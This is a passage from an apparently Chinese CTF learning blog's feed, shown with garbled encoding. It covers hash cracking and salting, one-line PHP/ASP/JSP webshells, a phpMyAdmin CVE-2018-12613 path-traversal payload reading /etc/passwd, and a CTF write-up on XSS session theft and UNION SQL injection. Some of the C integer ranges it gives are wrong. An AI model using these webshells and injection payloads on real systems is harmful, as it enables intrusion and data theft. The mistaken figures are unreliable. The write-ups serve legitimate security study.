·ï¼Ÿ<br>ç­”æ¡ˆå¾ˆå‡ºäººæ„æ–™ã€‚å¦‚æœè‡³å°‘ä¸¤ä¸ªåŒå­¦ç”Ÿæ—¥ç›¸åŒçš„æ¦‚ç‡ä¸è¶…è¿‡5%ï¼Œé‚£ä¹ˆè¿™ä¸ªç­åªèƒ½æœ‰7ä¸ªäººã€‚äº‹å®ä¸Šï¼Œä¸€ä¸ª23äººçš„ç­çº§æœ‰50%çš„æ¦‚ç‡ï¼Œè‡³å°‘ä¸¤ä¸ªåŒå­¦ç”Ÿæ—¥ç›¸åŒï¼›50äººç­çº§æœ‰97%çš„æ¦‚ç‡ï¼Œ70äººçš„ç­çº§åˆ™æ˜¯99.9%çš„æ¦‚ç‡ã€‚<br>ç”±è¯¥é—®é¢˜å¼•å‡ºçš„æ˜¯å–å€¼ç©ºé—´ä¸è®¡ç®—å“ˆå¸Œå€¼æ¬¡æ•°å’Œç¢°æ’æ¦‚ç‡çš„å…³ç³»ã€‚æ•°å­¦æ¨å¯¼æˆ‘è¿™å°±ä¸å†™äº†ã€‚æˆ‘æ•°å­¦æ¯”è¾ƒèœï¼Œå½“æ—¶çœ‹äº†ä¸€ä¼šæ‰çœ‹æ‡‚å’‹å›äº‹ã€‚ã€‚å¯¹ä¸èµ·å­™è€å¸ˆ<br>å–å€¼ç©ºé—´ä¸º365ï¼Œ70ä¸ªäººä¸­è‡³å°‘ä¸¤äººç”Ÿæ—¥é‡å¤çš„æ¦‚ç‡ä¸º99%ã€‚365å°±æ˜¯å–å€¼ç©ºé—´ï¼Œ70å°±æ˜¯å“ˆå¸Œè®¡ç®—æ¬¡æ•°ã€‚<br>ç”±ç”Ÿæ—¥æ”»å‡»ä¸å“ˆå¸Œç¢°æ’å¯¼å‡ºçš„é—®é¢˜æ˜¯ç ´è§£å“ˆå¸Œå€¼ä»¥åŠå¦‚ä½•é˜²å¾¡å“ˆå¸Œç ´è§£ã€‚</p><h3 id="å“ˆå¸Œå€¼ç ´è§£"><a href="#å“ˆå¸Œå€¼ç ´è§£" class="headerlink" title="å“ˆå¸Œå€¼ç ´è§£"></a>å“ˆå¸Œå€¼ç ´è§£</h3><p>ç”±äºå“ˆå¸Œå‡½æ•°æ˜¯å•å‘çš„ï¼Œæ‰€ä»¥ç ´è§£æ–¹å¼ç…§ç†æ¥è¯´åº”è¯¥æ˜¯æš´åŠ›ç ´è§£æˆ–è€…æ‰‹åŠ¨ç®—å­—å…¸çš„å“ˆå¸Œå€¼ï¼Œå»ºç«‹ä¸€ä¸ªä¸€ä¸€å¯¹åº”çš„å…³ç³»ç„¶åæŸ¥è¡¨ã€‚<br>å¯¹åº”æ–¹æ³•ï¼š1.æš´åŠ›ç ´è§£2.å­—å…¸3.å½©è™¹è¡¨<br>è¿™é‡Œé‡ç‚¹è¯´ä¸€ä¸‹å½©è™¹è¡¨ï¼Œå½©è™¹è¡¨å¹¶ä¸æ˜¯å•çº¯çš„åŸæ–‡-å¯†æ–‡ä¸€ä¸€å¯¹åº”çš„å½¢å¼ã€‚<br>å½©è™¹è¡¨å‰èº«â€“æ•£åˆ—é“¾<br>è®¾åŠ å¯†å‡½æ•°ä¸ºH(X)ï¼Œåˆ™æ•£åˆ—é“¾å­˜åœ¨ä¸€ä¸ªçº¦ç®€å‡½æ•°R(X)ï¼Œå…¶å®šä¹‰åŸŸå’Œå€¼åŸŸä¸H(X)ç›¸åã€‚<br>å¯¹äºæ•£åˆ—é“¾å’Œå½©è™¹è¡¨è¯¦ç»†çš„è®¡ç®—è¿‡ç¨‹æˆ‘è¿˜æ²¡çœ‹å¤ªæ˜ç™½ï¼Œè¯·æ•™å®Œè€å¸ˆå†æ¥å†™ã€‚<br>ç°åœ¨å·²çŸ¥çš„æ˜¯å½©è™¹è¡¨æ˜¯ä¸€ç§ä¸­å’Œçš„æ–¹å¼æ¥ç ´è§£å“ˆå¸Œå€¼ã€‚<br>å½“kè¶Šå¤§æ—¶ï¼Œç ´è§£æ—¶é—´å°±è¶Šé•¿ï¼Œä½†å½©è™¹è¡¨æ‰€å ç”¨çš„ç©ºé—´å°±è¶Šå°ï¼›<br>ç›¸åï¼Œkè¶Šå°æ—¶ï¼Œå½©è™¹è¡¨æœ¬èº«å°±è¶Šå¤§ï¼Œç›¸åº”çš„ç ´è§£æ—¶é—´å°±è¶ŠçŸ­ã€‚</p><h4 id="åŠ saltæŠµæŠ—å½©è™¹è¡¨"><a href="#åŠ saltæŠµæŠ—å½©è™¹è¡¨" class="headerlink" title="åŠ saltæŠµæŠ—å½©è™¹è¡¨"></a>åŠ saltæŠµæŠ—å½©è™¹è¡¨</h4><p>saltå¯ä»¥æ˜¯ä¸€ä¸²éšæœºæ•°ã€‚<br>å‡è®¾åŸæ–‡æ˜¯abcï¼Œ<br>ä¸åŠ saltåŠ å¯†åçš„æ•°æ®ä¸º DEFï¼ŒåŠ saltåŠ å¯†åçš„æ•°æ®ä¸ºGKD<br>å½©è™¹è¡¨è¿˜åŸå‡ºDEFçš„æ¦‚ç‡ç›¸å¯¹åŠ saltåçš„æ¦‚ç‡ç›¸å¯¹å¤§ä¸€äº›ã€‚å› ä¸ºå¯¹GKDè¿˜åŸåçš„æ•°æ®å¤§æ¦‚ç‡å°±ä¸æ˜¯åŸæ•°æ®abcäº†ã€‚<br>åº”ç”¨åœºæ™¯ï¼š<br>ç”¨æˆ·æ³¨å†Œæ—¶ï¼šhash(password+salt)-&gt;DB,salt-&gt;DB<br>ç”¨æˆ·ç™»å½•æ—¶ if(hash_in_db==hash(input_username+salt))<br>            return true;</p><h2 id="php-file-get-contents"><a href="#php-file-get-contents" class="headerlink" title="php file_get_contents()"></a>php file_get_contents()</h2><p>file_get_contents()æ–¹æ³•æŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥åˆ°å­—ç¬¦ä¸²ä¸­ã€‚</p><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>webshellæ˜¯ä»€ä¹ˆï¼Œshellæ˜¯ä»€ä¹ˆï¼Ÿ<br>shellæ˜¯ç”¨æˆ·ä¸æ“ä½œç³»ç»Ÿäº¤äº’çš„å·¥å…·ã€å¹³å°ã€‚webshellå°±æ˜¯åŸºäºwebçš„shellï¼Œå¯ä»¥ç”¨äºç½‘ç«™ç®¡ç†ç­‰åŠŸèƒ½ã€‚<br>å¸¸è§çš„webshellå°±æ˜¯å‘½ä»¤æ‰§è¡Œï¼Œæ¯”å¦‚phpçš„ <?php @eval(_$GET['cmd']);?> å°†è¿™å¥è¯å†™å…¥ä»¥PHPä¸ºåç«¯çš„ç½‘ç«™åï¼Œé€šè¿‡å¯¹è¯¥æ–‡ä»¶ä¼ å‚æ•°<a href="http://www.tst.com/1.php?cmd=whoami">www.tst.com/1.php?cmd=whoami</a><br>ç›¸å½“äºåœ¨shellä¸­æ‰§è¡Œwhoamiã€‚å½“ç„¶ï¼Œä¹Ÿå¯ä»¥ç”¨ä¸€äº›webshellç®¡ç†å·¥å…·æ–¹ä¾¿æ“ä½œï¼Œæ¯”å¦‚èœåˆ€ï¼Œèšå‰‘ã€‚<br>aspä¸€å¥è¯ï¼š &lt;%eval request(â€œxâ€)%&gt; &lt;%execute request(â€œMHâ€)%&gt;<br>jspä¸€å¥è¯ï¼š&lt;% Runtime.getRuntime().exec(request.getParameter(â€œshellâ€)); %&gt;</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> buu </tag>
            
            <tag> å¯†ç å­¦ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20200404å­¦ä¹ ç¬”è®°</title>
      <link href="2020/04/04/20200404%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>2020/04/04/20200404%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="ç¼…æ€€å…ˆçƒˆï¼Œå¾è¾ˆå½“è‡ªå¼ºã€‚"><a href="#ç¼…æ€€å…ˆçƒˆï¼Œå¾è¾ˆå½“è‡ªå¼ºã€‚" class="headerlink" title="ç¼…æ€€å…ˆçƒˆï¼Œå¾è¾ˆå½“è‡ªå¼ºã€‚"></a>ç¼…æ€€å…ˆçƒˆï¼Œå¾è¾ˆå½“è‡ªå¼ºã€‚</h1><h2 id="CVE-2018-12613-phpmyadmin-LFI-amp-amp-buuoj-ezweb"><a href="#CVE-2018-12613-phpmyadmin-LFI-amp-amp-buuoj-ezweb" class="headerlink" title="CVE-2018-12613 phpmyadmin LFI &amp;&amp;buuoj ezweb : )"></a>CVE-2018-12613 phpmyadmin LFI &amp;&amp;buuoj ezweb : )</h2><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://www.freebuf.com/vuls/176064.html">https://www.freebuf.com/vuls/176064.html</a><br>é¦–å…ˆåˆ†æindex.php:<br>åœ¨index.php ç¬¬56è¡Œï¼Œ<br> <img src="http://cdn.polowong.top/static/images/126133.jpg"><br>ä¼ å…¥çš„targetå‚æ•°éœ€è¦æ»¡è¶³å››ä¸ªæ¡ä»¶ï¼š<br>1.æ˜¯å­—ç¬¦ä¸²<br>2.ä¸èƒ½ä»¥indexå¼€å¤´<br>3.ä¸åœ¨é»‘åå•å†…<br>4.é€šè¿‡checkPageValidityå‡½æ•°æ£€éªŒï¼Œå³è¿”å›true<br>è·Ÿè¿›checkPageValidityå‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkPageValidity</span>(<span class="params">&amp;<span class="variable">$page</span>, <span class="keyword">array</span> <span class="variable">$whitelist</span> = []</span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">           <span class="variable">$whitelist</span> = <span class="built_in">self</span>::<span class="variable">$goto_whitelist</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">           <span class="variable">$page</span>,</span><br><span class="line">           <span class="number">0</span>,</span><br><span class="line">           mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">       );</span><br><span class="line">       <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line">       <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">           <span class="variable">$_page</span>,</span><br><span class="line">           <span class="number">0</span>,</span><br><span class="line">           mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">       );</span><br><span class="line">       <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å‡½æ•°åˆ†æï¼šå¦‚æœä¼ å…¥çš„ç™½åå•ä¸ºç©ºçš„è¯ï¼Œå°±å»æ‰¾goto_whitelistã€‚<br>å¦‚æœæ²¡æœ‰è®¾ç½®pageæˆ–è€…pageå˜é‡ä¸æ˜¯å­—ç¬¦ä¸² è¿”å›falseã€‚<br>å¦‚æœpageåœ¨ç™½åå•å†…ï¼Œè¿”å›true<br> mb_strpos($page . â€˜?â€™, â€˜?â€™)è·å¾—pageå˜é‡?å‰çš„é•¿åº¦ æ³¨æ„ï¼šâ€™.â€™ç”¨æ¥è¿æ¥ä¸¤ä¸ªå­—ç¬¦ä¸²<br> mb_substr è·å¾—[start,end)é•¿åº¦çš„å­—ç¬¦ä¸²ã€‚<br> ä¸¾ä¾‹å¦‚ä¸‹ï¼š<br> <img src="http://cdn.polowong.top/static/images/126134.jpg"><br> ç»§ç»­åˆ†æã€‚<br> æ¥åˆ°<br> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line">      <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">          <span class="variable">$_page</span>,</span><br><span class="line">          <span class="number">0</span>,</span><br><span class="line">          mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">      );</span><br><span class="line">      <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><br> å°†?ä¸¤æ¬¡urlencodeç¼–ç åä¸º%253fã€‚è¿›å…¥phpåä¼šè‡ªåŠ¨è§£ç ä¸€æ¬¡ï¼Œå˜æˆ%3fï¼Œç„¶åå†æ¬¡è§£ç ï¼ŒæˆåŠŸç»•è¿‡æ£€éªŒã€‚ï¼ˆä¸åŒé‡ç¼–ç æ— æ³•ç»•è¿‡çš„åŸå› ä¸º:å¦‚æœç›´æ¥ç»™ä¸€ä¸ª?çš„è¯,åœ¨ç¬¬ä¸€ä¸ªæˆªå–éªŒè¯ä¸­ï¼Œphpä¼šæŠŠé—®å·åé¢çš„ä¸œè¥¿å½“ä½œå‚æ•°ï¼Œincludeçš„è¿˜æ˜¯db_sql.phpã€‚ï¼‰<br> æ‰€ä»¥index.phpä¸­çš„INCLUDEå˜æˆäº†ï¼š<br> include db_sql.php%3f(ç”±äºphpä¼šæŠŠdb_sql.php%3få½“æˆç›®å½•ï¼Œæ‰€ä»¥éœ€è¦å¤šåŠ ä¸€ä¸ª../æ¥è·¨ç›®å½•ã€‚ï¼‰<br> payload:<a href="http://192.168.0.106:8080/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd">http://192.168.0.106:8080/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</a><br> <img src="http://cdn.polowong.top/static/images/126135.jpg"></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20200402å­¦ä¹ ç¬”è®°</title>
      <link href="2020/04/02/20200402%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>2020/04/02/20200402%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="åŠ¨æ€è§„åˆ’"><a href="#åŠ¨æ€è§„åˆ’" class="headerlink" title="åŠ¨æ€è§„åˆ’"></a>åŠ¨æ€è§„åˆ’</h2><p>ä»Šå¤©ä¸‹åˆåšäº†ä¸€ä¸ªåŠ¨æ€è§„åˆ’çš„é¢˜ è¿˜æ²¡å¤§å¼„æ˜ç™½ï¼Œæçš„ä¸è°ˆã€‚ç­‰æˆ‘ä¸‹æ¬¡çœ‹åˆ°è¿™or å­¦ä¹ ä¸€æ®µæ—¶é—´åŠ¨æ€è§„åˆ’åå†å»åšã€‚</p><h2 id="buuctf"><a href="#buuctf" class="headerlink" title="buuctf"></a>buuctf</h2><p>ä»Šå¤©åšäº†ä¸€é“ciscn 2019çš„é¢˜ã€‚å¾ˆæƒ­æ„§ã€‚<br>è¿™é“é¢˜æ˜¯åä¸œåŒ—èµ›åŒºåˆ†åŒºèµ›çš„ä¸€é“webé¢˜ï¼Œå½“æ—¶æˆ‘æ²¡åšå‡ºæ¥ï¼Œåªåšåˆ°äº†å¦‚ä½•ç ´è§£md5å‰å…­ä½çš„ä¸€æ­¥ï¼Œè€Œä¸”æ˜¯ç”¨åˆ«äººå†™çš„è„šæœ¬è·‘çš„ã€‚å½“æ—¶æ²¡åšxssçš„éƒ¨åˆ†ï¼Œé¦–å…ˆæ˜¯è¿‡æ»¤çš„é—®é¢˜ï¼Œè¿‡æ»¤çš„å­—ç¬¦å¤ªå¤šï¼Œå½“æ—¶æ²¡æœ‰æƒ³åˆ°æ€ä¹ˆç»•è¿‡ï¼Œå°±æ²¡æœ‰ç»§ç»­åšäº†â€¦.æˆ‘å¤ªèœäº†ã€‚<br>ä»Šå¤©åœ¨æ­¤æ•´ç†ä¸€ä¸‹è¯¥é¢˜çš„è§£é¢˜æ€è·¯ã€‚<br>é¦–å…ˆå†™ä¸€æ®µxssä»£ç ï¼Œæäº¤åæŠŠé“¾æ¥æ”¾åˆ°é—®é¢˜åé¦ˆé‚£ï¼Œç”¨è„šæœ¬è·‘ä¸€ä¸‹md5å‰6ä½ã€‚è¿™ä¸€æ­¥å®Œæˆåä¼šæœ‰ä¸€ä¸ªbotæ¨¡æ‹Ÿç®¡ç†å‘˜ï¼Œç®¡ç†å‘˜è®¿é—®åé€šè¿‡xsså‘é€ç®¡ç†å‘˜çš„èº«ä»½ä¿¡æ¯åˆ°æ¥æ”¶å¹³å°ã€‚ä»æ¥æ”¶å¹³å°è·å–åˆ°sessionåï¼Œä½¿ç”¨ç®¡ç†å‘˜ç™»å½•ã€‚<br>æ‰«æåå°å‘ç°admin.php<br>PHPSESSIDä¿®æ”¹åç™»å½•å³å¯<br>é¦–å…ˆç”¨group by åˆ¤æ–­åˆ—æ•°ï¼Œ<br>ç„¶åæ‰¾ä¸€ä¸‹æ•°æ®åº“å -1  and 1=2 union select 1,2,database() from information_schema.schemata -&gt;æ•°æ®åº“å ciscn<br>æ ¹æ®æ•°æ®åº“åæ‰¾è¡¨ï¼ˆé€šè¿‡limitçœ‹æœ‰å¤šå°‘è¡¨ã€å¤šå°‘å¤šå°‘å­—æ®µï¼‰-1  union select 1,2,table_name from information_schema.tables where table_schema=â€™ciscnâ€™ -ã€‹æ‰¾åˆ°è¡¨flag ç„¶ålimit æ‰¾å…¶ä»–çš„è¡¨ï¼Œè¿™é‡Œå…¶ä»–çš„è¡¨æ²¡å•¥ç”¨<br>æ ¹æ®è¡¨åæ‰¾åˆ—-1  union select 1,2,column_name  from information_schema.columns where table_name =â€™flagâ€™ -ã€‹æ‰¾åˆ°åˆ— flagg<br>æ ¹æ®åˆ—åæŸ¥æ•°æ® -1  union select 1,2,flagg from flag æ‰¾åˆ°flagã€‚<br>getflagã€‚<br>å½³äºã€‚ã€‚å°±çœ‹çœ‹userè¡¨æœ‰å•¥æŠŠ<br>-1  union select 1,2,table_name from information_schema.tables where table_schema=â€™ciscnâ€™ limit 1,1 æ‰¾åˆ°usersè¡¨<br>-1  union select 1,2,column_name from information_schema.columns where table_name=â€™usersâ€™   æ‰¾åˆ°USERå­—æ®µ limit 1,1 æ‰¾åˆ°CURRENT_CONNECTIONSï¼Œusernameï¼Œpasswordå­—æ®µ<br>-1  union select 1,username,password from users limit  è¿™å¥è¯åº”è¯¥å°±å¯¹åº”ç€è¿™ä¸ªæŸ¥è¯¢æ¡† select username,password from users where id=?<br>è¿™é“é¢˜å°±ç»“æŸäº†ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20200331å­¦ä¹ ç¬”è®°</title>
      <link href="2020/03/31/20200331%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>2020/03/31/20200331%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="æµ®ç”Ÿæ—¥è®°"><a href="#æµ®ç”Ÿæ—¥è®°" class="headerlink" title="æµ®ç”Ÿæ—¥è®°"></a>æµ®ç”Ÿæ—¥è®°</h1><p>2020.3.31 æ™´<br>ä»Šå¤©åˆæ˜¯èœé¸¡çš„ä¸€å¤©ï¼Œåˆ·é¢˜å…¥é—¨é¢˜å°±ä¸ä¼šï¼Œå¿ƒæ€å´©äº†<br>dpï¼Œä¸€å®šæ‹¿ä¸‹ï¼</p><h2 id="cè¯­è¨€ç›¸å…³"><a href="#cè¯­è¨€ç›¸å…³" class="headerlink" title="cè¯­è¨€ç›¸å…³"></a>cè¯­è¨€ç›¸å…³</h2><p>å‚è€ƒé“¾æ¥ï¼š<br><a href="https://blog.csdn.net/danxibaoxxx/article/details/81236180">https://blog.csdn.net/danxibaoxxx/article/details/81236180</a><br><a href="https://blog.csdn.net/CV_Jason/article/details/85244813">https://blog.csdn.net/CV_Jason/article/details/85244813</a><br><a href="https://blog.csdn.net/bestkilly/article/details/80659109?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task">https://blog.csdn.net/bestkilly/article/details/80659109?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task</a><br><a href="https://blog.csdn.net/abaloon/article/details/8173552">https://blog.csdn.net/abaloon/article/details/8173552</a><br><a href="https://blog.csdn.net/ai_yue/article/details/82777806?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task">https://blog.csdn.net/ai_yue/article/details/82777806?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task</a></p><h3 id="ld-amp-lf"><a href="#ld-amp-lf" class="headerlink" title="ld&amp;lf"></a>ld&amp;lf</h3><p>è¿™æ¶‰åŠåˆ°äº†cè¯­è¨€çš„ç²¾åº¦é—®é¢˜ã€‚<br>é¦–å…ˆçœ‹å¸¸è§æ•°æ®ç±»å‹çš„å–å€¼èŒƒå›´ï¼š<br>char -128 ~ +127 (1 Byte)<br>short -32767 ~ + 32768 (2 Bytes)<br>unsigned short 0 ~ 65536 (2 Bytes)<br>int -2147483648 ~ +2147483647 (4 Bytes)<br>unsigned int 0 ~ 4294967295 (4 Bytes)<br>long == int<br>long long -9223372036854775808 ~ +9223372036854775807 (8 Bytes)<br>double 1.7 * 10^308 (8 Bytes)<br>unsigned int 0ï½4294967295<br>long longçš„æœ€å¤§å€¼ï¼š9223372036854775807<br>long longçš„æœ€å°å€¼ï¼š-9223372036854775808<br>unsigned long longçš„æœ€å¤§å€¼ï¼š1844674407370955161<br>__int64çš„æœ€å¤§å€¼ï¼š9223372036854775807<br>__int64çš„æœ€å°å€¼ï¼š-9223372036854775808<br>unsigned __int64çš„æœ€å¤§å€¼ï¼š18446744073709551615<br>ç»“è®ºï¼š<br>è¾“å…¥è¾“å‡ºlong long/doubleçš„æ—¶å€™éœ€è¦ç”¨%ld/%lf</p><h3 id="å­˜å‚¨å½¢å¼"><a href="#å­˜å‚¨å½¢å¼" class="headerlink" title="å­˜å‚¨å½¢å¼"></a>å­˜å‚¨å½¢å¼</h3><p>å­˜å‚¨å½¢å¼å‚è€ƒç¬¬ä¸‰ä¸ªé“¾æ¥ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯é˜¶ç æ˜¯æ€ä¹ˆå¾—æ¥çš„ï¼Œæˆ‘ä¸€å¼€å§‹ä¹Ÿæƒ³é”™äº†ã€‚</p><h3 id="è¡¥ç è¡¨ç¤ºèŒƒå›´"><a href="#è¡¥ç è¡¨ç¤ºèŒƒå›´" class="headerlink" title="è¡¥ç è¡¨ç¤ºèŒƒå›´"></a>è¡¥ç è¡¨ç¤ºèŒƒå›´</h3><p>ä¸ºä»€ä¹ˆå…«ä½äºŒè¿›åˆ¶è¡¥ç çš„è¡¨ç¤ºèŒƒå›´æ˜¯-128 â€” +127ï¼Ÿ<br>é¦–å…ˆæ˜ç¡®ç¬¬ä¸€ä½æ˜¯ç¬¦å·ä½ã€‚<br>ä»¥ä¸‹ä¸ºåŸç è¡¨ç¤ºï¼š<br>æ­£æ•°ï¼š +0â€”+127<br>00000000â€”01111111<br>è´Ÿæ•°ï¼š-0 â€”-   -127<br>10000000 â€”-   11111111</p><hr><p>æ— ç¬¦å·æ•°10000000ä»£è¡¨128ï¼Œåœ¨è¡¥ç ä¸­æœ¬æ¥åº”è¯¥æ˜¯-0ï¼Œç”±äºä¸€ä¸ªæ•°å¯¹åº”ä¸€ä¸ªè¡¥ç ï¼Œæ‰€ä»¥-0çš„è¡¥ç ç”¨æ¥è¡¨ç¤º-128ã€‚è¿™ä¹Ÿè§£é‡Šäº†ä¸ºä»€ä¹ˆ8ä½äºŒè¿›åˆ¶æ•°å¯è¡¨ç¤ºçš„èŒƒå›´æ˜¯-128~127ã€‚<br><img src="/img/bin1.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> cè¯­è¨€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux&amp;shell&amp;åå¼¹shell&amp;ç¯å¢ƒå˜é‡</title>
      <link href="2020/03/30/linux-shell-%E5%8F%8D%E5%BC%B9shell/"/>
      <url>2020/03/30/linux-shell-%E5%8F%8D%E5%BC%B9shell/</url>
      
        <content type="html"><![CDATA[<blockquote><p>è¿‘æœŸå­¦ä¹ äº†è®¸å¤šå…³äºLinuxçš„åŸºç¡€çŸ¥è¯†ï¼Œä¹Ÿä»ä¾§é¢åæ˜ å‡ºäº†æˆ‘ä¸Šè¯¾æ‰€å­¦çš„åŸºç¡€çŸ¥è¯†æ²¡æœ‰å¤šåŠ ç»ƒä¹ ï¼Œå¿˜äº†ä¸å°‘ã€‚<br>æœ¬æ–‡å­¦ä¹ è·¯çº¿ï¼šé¦–å…ˆæ˜¯åœ¨CTFæ¯”èµ›ä¸­é‡åˆ°äº†éœ€è¦åå¼¹shellçš„é—®é¢˜ï¼Œé‡‡ç”¨å¸¸ç”¨åå¼¹shellçš„æ–¹å¼æ— æ³•åå¼¹ï¼Œäºæ˜¯å­¦ä¹ äº†ç”¨curlåå¼¹shellç­‰å¤šç§åå¼¹shellçš„æ–¹å¼ï¼›æ¢ç©¶åå¼¹shellçš„æœ¬è´¨ï¼Œå­¦ä¹ åˆ°äº†&lt;ä¸&gt;ä»¥åŠè¾“å…¥è¾“å‡ºé‡å®šå‘ï¼›<br>è·‘è„šæœ¬çš„æ—¶å€™å¤ªéº»çƒ¦ï¼Œéœ€è¦åˆ‡æ¢åˆ°è„šæœ¬ç›®å½•ï¼Œäºæ˜¯å­¦ä¹ äº†å¦‚ä½•æ·»åŠ ç¯å¢ƒå˜é‡ä»¥åŠå¦‚ä½•ç”¨aliasã€‚</p></blockquote><h1 id="é¢„å¤‡çŸ¥è¯†"><a href="#é¢„å¤‡çŸ¥è¯†" class="headerlink" title="é¢„å¤‡çŸ¥è¯†"></a>é¢„å¤‡çŸ¥è¯†</h1><p>linux shellã€åå¼¹shellã€é‡å®šå‘ã€ç¯å¢ƒå˜é‡</p><h1 id="å‚è€ƒã€è‡´æ•¬ï¼ˆå¼ºçƒˆå»ºè®®å…ˆé˜…è¯»å‚è€ƒã€è‡´æ•¬çš„æ–‡ç« å†é˜…è¯»æœ¬æ–‡ï¼‰"><a href="#å‚è€ƒã€è‡´æ•¬ï¼ˆå¼ºçƒˆå»ºè®®å…ˆé˜…è¯»å‚è€ƒã€è‡´æ•¬çš„æ–‡ç« å†é˜…è¯»æœ¬æ–‡ï¼‰" class="headerlink" title="å‚è€ƒã€è‡´æ•¬ï¼ˆå¼ºçƒˆå»ºè®®å…ˆé˜…è¯»å‚è€ƒã€è‡´æ•¬çš„æ–‡ç« å†é˜…è¯»æœ¬æ–‡ï¼‰"></a>å‚è€ƒã€è‡´æ•¬ï¼ˆå¼ºçƒˆå»ºè®®å…ˆé˜…è¯»å‚è€ƒã€è‡´æ•¬çš„æ–‡ç« å†é˜…è¯»æœ¬æ–‡ï¼‰</h1><p><a href="https://xz.aliyun.com/t/2548">https://xz.aliyun.com/t/2548</a><br><a href="https://xz.aliyun.com/t/2549">https://xz.aliyun.com/t/2549</a><br><a href="http://www.linuxso.com/command/alias.html">http://www.linuxso.com/command/alias.html</a><br><a href="https://blog.csdn.net/revilwang/article/details/8374362">https://blog.csdn.net/revilwang/article/details/8374362</a><br><a 